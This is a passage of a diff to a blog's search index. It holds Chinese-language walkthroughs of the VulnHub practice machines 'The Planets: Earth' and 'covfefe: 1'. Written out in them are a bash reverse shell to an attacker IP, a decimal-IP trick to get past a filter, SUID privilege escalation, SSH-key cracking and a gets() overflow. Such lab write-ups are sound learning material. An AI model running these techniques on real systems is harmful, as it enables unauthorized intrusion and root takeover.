class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>用dirb扫描了一下，发现有个后台<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>不过需要用户名和密码<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>另外一个也用dirb扫了一下，发现robots.txt是有东西的<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>比较可疑的是最后的居然屏蔽的是文件格式，那就试一下吧。<br>发现/testingnotes.txt有提示<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>去访问了一下testdata.txt，发现了几句话。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>根据提示可以看出来，我们需要解密之前留言板上的密文————用testdata.txt异或解密<br>找在线网站解密一下，拿到了密码<code>earthclimatechangebad4humans</code><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>登录之后发现了命令行交互，于是决定打个反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.155.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>但是失败了，好像是对ip有限制<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>于是尝试绕过</p>
+<blockquote>
+<p><a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232275328/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>拿到了第一个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>先去看一下/usr/bin/reset_root<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>执行失败<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>是一个可执行的二进制文件，可以利用nc传输到kali攻击机上。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ltrace -S ./reset_root</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>可以看到程序运行的时候提示缺少了几个文件<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>那咋办呢？那就创建一个吧<br>在靶机上创建好后去运行，拿到了root的密码Earth<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br>于是su切换到root用户输入密码<br>进入/root目录，拿到第二个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>至此，渗透结束。</p>
+<hr>
+<blockquote>
+<p>暮晓春来迟，先于百花知。岁岁种桃花，开在断肠时。</p>
 </blockquote>
 <hr>
 ]]></content>
@@ -1278,43 +1407,34 @@
       </tags>
   </entry>
   <entry>
-    <title>靶机The Planets: Earth渗透记录</title>
-    <url>/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>前段时间忙于比赛，现在要继续开始学习了，不过又因为期末了所以靶机渗透更新的还是很慢…<br>本人学疏才浅，大佬们轻喷…</p>
-<hr>
-<blockquote>
-<p>下载地址：<a href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+    <title>靶机covfefe: 1渗透记录</title>
+    <url>/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<h2 id="好久不写笔记了，随便整个靶机划划水"><a href="#好久不写笔记了，随便整个靶机划划水" class="headerlink" title="好久不写笔记了，随便整个靶机划划水"></a>好久不写笔记了，随便整个靶机划划水</h2><blockquote>
+<p>下载地址：<a href="https://www.vulnhub.com/entry/covfefe-1,199/">https://www.vulnhub.com/entry/covfefe-1,199/</a></p>
 </blockquote>
 <hr>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机The Planets: Earth×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用arp-scan扫描ip，然后用mac地址确定目标<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>扫扫扫</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.164</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>根据nmap扫描的结果可以发现我们是需要加host才能打开那两个网址<br>访问靶机ip也就一个服务开启的默认界面<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>加上host之后打开</p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"></p>
+<p>ps：covfefe是川建国自创的新词（） 看起来也是很有趣的靶机（）</p>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机SSH-私钥泄露×1 NAT模式<br>攻击机 win10  kali 2021.2×1<br>搜索引擎，你学习的热情</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开虚拟机<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>首先先确定目标ip，这个时候可以扫描内网，如果不知道哪个是我们的目标可以看一下mac地址。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定好ip之后，进行更深一步的探测</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.146</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>可以看到有一个22端口（ssh服务），还有两个http服务。<br>先去网页看一下吧。</p>
 <span id="more"></span>
-<p>测试界面，啊我不信<br>另外一个地址打开后是类似一个留言功能的业务<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>好像没啥漏洞，不过发送记录会展示在页面，发现了三串数字</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>用dirb扫描了一下，发现有个后台<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>不过需要用户名和密码<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>另外一个也用dirb扫了一下，发现robots.txt是有东西的<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>比较可疑的是最后的居然屏蔽的是文件格式，那就试一下吧。<br>发现/testingnotes.txt有提示<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>去访问了一下testdata.txt，发现了几句话。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>根据提示可以看出来，我们需要解密之前留言板上的密文————用testdata.txt异或解密<br>找在线网站解密一下，拿到了密码<code>earthclimatechangebad4humans</code><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>登录之后发现了命令行交互，于是决定打个反弹shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.155.128/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p>但是失败了，好像是对ip有限制<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>于是尝试绕过</p>
-<blockquote>
-<p><a href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232275328/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>拿到了第一个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>先去看一下/usr/bin/reset_root<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>执行失败<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>是一个可执行的二进制文件，可以利用nc传输到kali攻击机上。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ltrace -S ./reset_root</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>可以看到程序运行的时候提示缺少了几个文件<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>那咋办呢？那就创建一个吧<br>在靶机上创建好后去运行，拿到了root的密码Earth<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br>于是su切换到root用户输入密码<br>进入/root目录，拿到第二个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>至此，渗透结束。</p>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>给了两个网页都没东西，用字典工具跑一下看看有没有别的发现<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>先去/robots.txt看看<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>前两个都属于配置文件，不用太关注，直接访问/taxes目录<br>获得了第一个flag    flag1{make_america_great_again}<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>好家伙，看来国外的CTF也喜欢玩梗哈哈哈<br>在访问一下/.ssh<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"><br>尝试下载私钥，发现可以下载，那就说明这里有一处漏洞了。<br>拿到私钥我们就无需密码即可进行ssh链接。<br>首先需要修改权限，必须是600！必须是600！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 600 id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>修改权限后，进行链接。<br>账户在关键字中有泄露<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa simon@192.168.155.146   </span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>还是需要密码，需要用john进行破解<br>先用ssh2john.py转换成john可识别的信息</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id_rsa &gt; 1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>破解。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>破解出来了，接着ssh链接。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br>链接成功。</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>跳转到/root目录发现有flag文件，但是没有权限打不开。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>不是root权限，需要提权<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"><br>查找root权限可执行文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br><code>/root</code>目录下有个<code>read_message</code>，这不巧了吗，能以root权限运行的程序里就有<code>read_message</code>，就从这里入手。<br>运行一下这个文件看看是什么。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>简单的pwn 通过栈溢出来获取flag。<br>程序的意思大概是如果你是Simon，就会调用execve函数，而这个函数调用程序使用的是root权限。然而buf[]只能储存20个字符，gets（buf）没有限制长度，超过20个字符的字符就会存到缓冲区，覆盖后面的内容。输入超过缓存长度的字符 超出的那部分为拥有root权限的路径。<br>Simon后面随便来十五个字符。</p>
+<p>本人菜，哪里解释错了欢迎师傅们指出来。</p>
+<p>运行文件，在Simon后面随便来十五个字符再加上/bin/sh即可提权成功。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br>提权成功，拿到最后一个flag。<br>至此，渗透结束。</p>
 <hr>
-<blockquote>
-<p>暮晓春来迟，先于百花知。岁岁种桃花，开在断肠时。</p>
-</blockquote>
-<hr>
+<p>本人萌新一枚，不足之处希望师傅们可以指出来让我好好学习一下。<br>最后，感谢你看到这里~o(<em>￣︶￣</em>)o</p>
 ]]></content>
       <categories>
         <category>靶机渗透记录</category>
@@ -1358,43 +1478,6 @@
 <p>在海天相接的地方，飞鸟也可以亲吻鱼。</p>
 </blockquote>
 <hr>
-]]></content>
-      <categories>
-        <category>靶机渗透记录</category>
-      </categories>
-      <tags>
-        <tag>靶机渗透记录</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>靶机covfefe: 1渗透记录</title>
-    <url>/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<h2 id="好久不写笔记了，随便整个靶机划划水"><a href="#好久不写笔记了，随便整个靶机划划水" class="headerlink" title="好久不写笔记了，随便整个靶机划划水"></a>好久不写笔记了，随便整个靶机划划水</h2><blockquote>
-<p>下载地址：<a href="https://www.vulnhub.com/entry/covfefe-1,199/">https://www.vulnhub.com/entry/covfefe-1,199/</a></p>
-</blockquote>
-<hr>
-<p>ps：covfefe是川建国自创的新词（） 看起来也是很有趣的靶机（）</p>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机SSH-私钥泄露×1 NAT模式<br>攻击机 win10  kali 2021.2×1<br>搜索引擎，你学习的热情</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>打开虚拟机<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"><br>首先先确定目标ip，这个时候可以扫描内网，如果不知道哪个是我们的目标可以看一下mac地址。<br><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>确定好ip之后，进行更深一步的探测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.146</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>可以看到有一个22端口（ssh服务），还有两个http服务。<br>先去网页看一下吧。</p>
-<span id="more"></span>
